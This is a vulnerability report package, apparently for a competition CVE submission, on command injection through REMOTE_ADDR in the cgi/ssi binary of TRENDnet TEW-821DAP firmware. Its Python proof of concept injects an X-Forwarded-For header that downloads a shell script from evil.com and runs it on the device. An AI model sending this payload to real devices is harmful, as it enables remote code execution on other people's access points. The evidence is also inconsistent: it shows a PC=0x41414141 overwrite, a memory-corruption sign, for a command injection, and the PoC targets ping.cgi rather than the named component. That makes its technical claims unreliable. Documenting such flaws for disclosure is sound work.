# Technical Report: CVE-XXXX-XXXX6: TEW-821DAP cgi/ssi REMOTE_ADDR Command Injection

## Normalized Submission Metadata

| Field | Value |
|---|---|
| Vendor | TRENDnet |
| Product | TRENDnet TEW-821DAP Access Point |
| Firmware / Version | v2.2.01b05 |
| Affected Component | cgi/ssi |
| Vulnerability Type | Command Injection / RCE |
| CWE | CWE-77 |
| CVSS | 9.8 Critical |
| Source Material | E:\competition\漏洞\vulns\vulns\vuln-821dap-ssi-remote-command-injection |

## Executive Summary

The team-provided report describes a CVE-level vulnerability in TRENDnet TEW-821DAP Access Point affecting cgi/ssi. The issue is categorized as Command Injection / RCE and is supported by the copied PoC and evidence files in this package.

## Original Technical Detail

The original report is embedded below for reviewer convenience. The untouched copy is also available at source/REPORT.original.md.

---

# CVE-XXXX-XXXX6: TEW-821DAP cgi/ssi REMOTE_ADDR Command Injection

| 字段 | 值 |
|------|-----|
| 厂商 | TRENDnet | 产品 | TEW-821DAP v2.2.01b05 |
| 二进制 | `https/cgi/ssi` | 漏洞类型 | CWE-77 Command Injection |
| CVSS 3.1 | **9.8 Critical** |

## 1. 漏洞概述

cgi/ssi 中的多个函数通过 `getenv("REMOTE_ADDR")` 获取请求来源 IP 后，直接传入 `popen()` 或 `system()` 执行系统命令（如 ping/traceroute 功能）。攻击者伪造 X-Forwarded-For 或直接使用恶意源 IP 即可注入命令。

## 2. FirmRec 证据

```
0x4312CC: addiu sp, sp, -1904   ; 1904B frame
0x42BB88: getenv("REMOTE_ADDR") → popen → PC=0x41414141 (14次命中)
0x4315DC: getenv("REMOTE_ADDR") → popen → PC=0x41414141 (21次命中)
```

Simexp 命中: CVE-2022-30078 @ 0x4312cc (14 hits), 0x4315dc (21 hits), 0x42bb88 (6 hits)

## 3. PoC

```python
import requests
requests.get("http://TEW-821DAP/cgi-bin/ping.cgi",
    params={"ipaddr": "; id; ls /; #"},
    headers={"X-Forwarded-For": "127.0.0.1; wget http://evil.com/shell -O /tmp/sh; sh /tmp/sh #"})
```

